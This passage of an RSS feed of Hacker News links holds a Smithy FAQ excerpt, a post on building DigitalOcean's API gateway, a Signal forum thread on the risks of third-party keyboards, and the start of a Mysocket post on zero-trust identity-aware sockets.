                intended for. This allows for use cases like maintaining an internal
                and external version of a model and providing beta models to customers
                as part of a private beta.</p>

            <h2>What does protocol-agnostic mean?</h2>
            <p>Protocol-agnostic means that the model is an abstraction that specifies
                the rules and semantics of how a client and server communicate. The
                transport and serialization format of a service is left as an
                implementation detail, allowing them to evolve over time. For example,
                a service owner may wish to evolve their serialization format (e.g.,
                move from text to binary), their connection type (e.g., move from
                HTTP/1 to HTTP/2), or launch entirely new capabilities.</p>

            <h2>What is the main difference between Smithy and OpenAPI?</h2>
            <p>The primary difference between Smithy and OpenAPI is that Smithy is
                protocol-agnostic, allowing Smithy to describe a broader range of
                services, metadata, and capabilities. Smithy can be used alongside
                OpenAPI by <a href="https://awslabs.github.io/smithy/guides/converting-to-openapi.html">converting Smithy models to OpenAPI</a>.</p>

            <section>
                <a href="https://awslabs.github.io/smithy/quickstart.html">Quick start -&gt;</a>
            </section>
        </div>
    </div></div>]]>
            </description>
            <link>https://awslabs.github.io/smithy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794213</guid>
            <pubDate>Fri, 15 Jan 2021 18:26:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean‚Äôs API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25793830">thread link</a>) | @louis-paul
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I‚Äôve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean‚Äôs API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one ‚Äúmonolith library‚Äù that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn‚Äôt ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn‚Äôt match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn‚Äôt just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter‚Äôs Finagle) wasn‚Äôt an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn‚Äôt be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Cal√ßado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn‚Äôt be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We‚Äôd augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it‚Äôs routing table. It would perform basic health checking and remove destinations that weren‚Äôt reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java‚Äôs Servlet API or Ruby‚Äôs Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn‚Äôt we pick something that existed? Fair question. There really weren‚Äôt many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby‚Äôs serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we‚Äôd have to write this session decrypting and parsing logic in Lua scripts we‚Äôd bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn‚Äôt robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two ‚Äúfilters‚Äù we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by ‚Äúdoing‚Äù the filter work for both monoliths but not acting on them, we‚Äôd check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we‚Äôd log that and work on figuring out why it didn‚Äôt work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn‚Äôt run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren‚Äôt exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you‚Äôre working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn‚Äôt have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang‚Äôs http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn‚Äôt know what it was until we checked their configs and noticed they just didn‚Äôt set a value (while we did have a max timeout for all requests on our end, so we‚Äôd close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn‚Äôt ideal. There was very little validation in place and it was super simple for people to register routes that wouldn‚Äôt load or that wouldn‚Äôt really route anything due to being incomplete. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793830</guid>
            <pubDate>Fri, 15 Jan 2021 17:58:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[68.3% of people in China use third-party keyboards ‚Äì many of them use Signal]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 68 (<a href="https://news.ycombinator.com/item?id=25793438">thread link</a>) | @resynth1943
<br/>
January 15, 2021 | https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272 | <a href="https://web.archive.org/web/*/https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:00:26Z">
                November 22, 2019,  6:00pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:00:26Z">
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Inspired by this thread: <a href="https://twitter.com/RealSexyCyborg/status/1197695344575799296" rel="nofollow noopener">https://twitter.com/RealSexyCyborg/status/1197695344575799296</a></p>
<p>‚Äú68.3% of smartphones in China are using third-party IME apps.‚Äù (<a href="http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf" rel="nofollow noopener">http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf</a>)</p>
<p>Anecdotal evidence (from the above thread) warns that users unfamiliar with IME (or careless about its risks) are promoting Signal as ‚Äúsecure‚Äù without pointing out the dangers associated with third-party IME. This undercuts the purpose of the app for a large group of people, many of whom face far graver consequences for insecure communications than their English-speaking counterparts.</p>
<p>When Signal detects the user speaks a language likely to be accompanied by third-party IME, it should visibly warn the user of the risks.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">
          <meta itemprop="keywords" content="">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:36:33Z">
                November 22, 2019,  6:36pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:36:33Z">
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Welcome to the forum.</p>
<p>What does IME stand for?</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          

<p>I could not have summed it up better‚Ä¶ While I understand the concern, I don‚Äôt see Signal being responsible for solving this threat vector.</p>

<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/PiCob"><span itemprop="name">PiCob</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-22T20:09:07Z">
              <time itemprop="dateModified" datetime="2019-11-22T20:09:19Z">
                November 22, 2019,  8:09pm
              </time>
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <p>input method editor (e.g. software keyboard)</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T21:21:55Z">
                November 22, 2019,  9:21pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T21:21:55Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <p>Can Android apps get checksums of other apps? Then it could warn about some non legit apps at least.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T23:38:58Z">
                November 22, 2019, 11:38pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T23:38:58Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>Ony if you have root. But they can get a list of installed packages.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-23T13:06:24Z">
              <time itemprop="dateModified" datetime="2019-11-23T13:11:23Z">
                November 23, 2019,  1:11pm
              </time>
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>Wait so just to be clear, the ‚Äúsignal vulnerability‚Äù is that Android‚Äôs Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don‚Äôt see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>‚ÄúResponsibility‚Äù is a bit illusory. I think it‚Äôs more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they‚Äôre responsible for every possible ‚Äúbutterfly effect‚Äù of their decisions. That debate is a bit academic and I don‚Äôt think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users‚Äô trust if the app gives the impression of ‚Äúspying‚Äù on their language is a fair concern. But I think it could be implemented in a way that ‚Äútracks‚Äù nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of ‚Äú50% or more Chinese characters‚Äù. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you‚Äôre writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone‚Äôs built-in keyboard."</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:09:07Z">
                November 23, 2019,  1:09pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:09:07Z">
          <span itemprop="position">#10</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
</blockquote>
<p>Absolutely, and I wouldn‚Äôt recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn‚Äôt be (and I don‚Äôt think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:14:00Z">
                November 23, 2019,  1:14pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:14:00Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>That sounds like it has the potential to be a really slick heuristic. ‚ÄúYou seem to be using X app‚Ä¶ here‚Äôs why that might be a problem.‚Äù On the other hand, there might be a higher risk of false positives than with a ‚Äú50%+ Chinese characters‚Äù heuristic. I‚Äôll have to defer to folks who know more about app development.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:18:26Z">
                November 23, 2019,  1:18pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:18:26Z">
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk‚Äôs would make it even more difficult.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T14:40:33Z">
                January 12, 2021,  2:40pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T14:40:33Z">
          <span itemprop="position">#13</span>
          </span>
        </p></div>
        <p>Just here to bump this issue as it is clearly still relevant and is quite concerning that Signal isn‚Äôt offering a response?</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-12T15:00:30Z">
              <time itemprop="dateModified" datetime="2021-01-12T15:02:46Z">
                January 12, 2021,  3:02pm
              </time>
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I‚Äôm not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:18:56Z">
                January 12, 2021,  3:18pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:18:56Z">
          <span itemprop="position">#16</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/jwithing"><span itemprop="name">jwithing</span></a>
            (Jeff)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:24:29Z">
                January 12, 2021,  3:24pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:24:29Z">
          <span itemprop="position">#17</span>
          </span>
        </p></div>
        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:33:39Z">
                January 12, 2021,  3:33pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:33:39Z">
          <span itemprop="position">#18</span>
          </span>
        </p></div>
        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
           ‚Ä¶</span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</a></em></p>]]>
            </description>
            <link>https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793438</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity Aware Sockets ‚Äì zero trust]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25793432">thread link</a>) | @bgpdude
<br/>
January 15, 2021 | https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services | <a href="https://web.archive.org/web/*/https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><div id="viewer-f7ddu"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_3435790ea1404e07901cfb8dd840f2f7~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_3435790ea1404e07901cfb8dd840f2f7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-6ffpc"><span><em>In this blog post, we‚Äôll introduce an exciting new feature that, with the help of Mysocket, allows you to deploy your own Beyond Corp setup.</em></span></p><h2 id="viewer-61f1u"><span>What is Zero Trust</span></h2><p id="viewer-2o96s"><span>The main concept behind Zero Trust is that users shouldn‚Äôt just be trusted because they are on your network. This implicit trust problem is something we typically see with, for example, corporate VPNs. With most corporate VPN‚Äôs once a user is authenticated, the user becomes part of the corporate network and, as a result, has access to many of the resources within the corporate infrastructure. In other words, once you‚Äôre on the VPN, you‚Äôre within the walls of the castle, you‚Äôre trusted, and you have lots of lateral access.</span></p><p id="viewer-btiap"><span>The world is changing, and the once traditional approach of trusting devices on your network are over. A few years ago, Google started the journey to their implementation of Zero trust called Beyond Corp. One of the core building blocks to get to a Zero Trust model is Identity aware application proxies. These proxies can provide strict access control on a per-application granularity, taking the users‚Äô identity and contexts such as location and device status into account.</span></p><h2 id="viewer-3ila3"><span>Identity aware proxies</span></h2><p id="viewer-57q5s"><span>As of today, the Mysocket proxies have support for OpenID Connect, and with that, your sockets are identity-aware. This means that mysocket users can now enable authentication for their services and provide authorization rules.</span></p><pre id="viewer-5rebq"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">contractor1@gmail.com</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-d2hm3"><span>The example above shows how we can enable authentication by using the ‚Äú<em>cloudauth</em>‚Äù CLI parameter. With <em>cloudauth</em> enabled, users will be asked to authenticate before access to your service is granted. Currently, we support authentication using Google, Facebook, Github, or locally created accounts. </span></p><p id="viewer-1dt8o"><span>The authentication flow uses OpenID connect to interact with the various Identity providers (IDP); thus, we can easily add more Identity providers in the future. We‚Äôre also looking at SAML as a second authentication flow. Please let us know if you have a need for more IDP‚Äôs or SAML, and we‚Äôll work with you.</span></p><h2 id="viewer-4nklj"><span>Authorizations rules</span></h2><p id="viewer-8klui"><span>In addition to what the Identity Service Provider (IDP) provides, mysocket also provides two authorization rules. The‚Ää<em>‚Äî‚Ääallowed_email_domain </em>allows users to specify a comma-separated list of email domains. If your users are authenticating using their <em>mycorp.com</em> email address, then by adding this domain as an <em>allowed_email_domain</em>, will make sure only users with that domain have will be granted access.</span></p><p id="viewer-dv1a2"><span>Since multiple identities providers are supported, it‚Äôs easy to extend access to contractors or other 3rd party users. To provide access to external contractors that are not part of your mycorp.com domain, we can use the <em>allowed_email_addresses</em> parameter to add individual identities. This is great because now you can provide these contractors access without creating corporate accounts for them.</span></p><p id="viewer-50slu"><span>These are just two authorization rules; we‚Äôre planning to add more types of rules in the near future. Additional authorization rules that come to mind are, Geo-based rules (only allow access from certain countries or regions) or time of day type rules. If you require these types of rules or have suggestions for additional authorization rules, please let us know!</span></p><h2 id="viewer-6g4ct"><span>VPN replacement</span></h2><p id="viewer-ejnaq"><span>One of the unique features of mysocket is that the origin server initiates the connection to the Mysocket edge. This means that the origin servers can be on a highly secure network that only allows outbound connections. Meaning the origins can be hosted behind strict firewall rules or even behind NAT, like for example, a Private AWS VPC. With this, your origin server remains private and hidden.</span></p><p id="viewer-7eejt"><span>With the addition of authentication and authorization to Mysocket, we can now, on a very granular basis, provide access to your private services. Combining the secure outbound tunnel property and the identity-aware sockets, we can now look at this to provide an alternative to VPNs, while providing much more granular access to private or corporate resources.</span></p><div id="viewer-3l8b0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_1000%2Ch_700%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><h2 id="viewer-adqh4"><span>Example use case</span></h2><p id="viewer-8d2kt"><span>Imagine a scenario where you work with a contractor that needs access to one specific private application, say an internal wiki, ticket system, or the git server in your corporate network. With the traditional VPN setup, this means we‚Äôd need to provide the contractor with a VPN account. Typically this means the contractor is now part of the corporate network, has a corporate 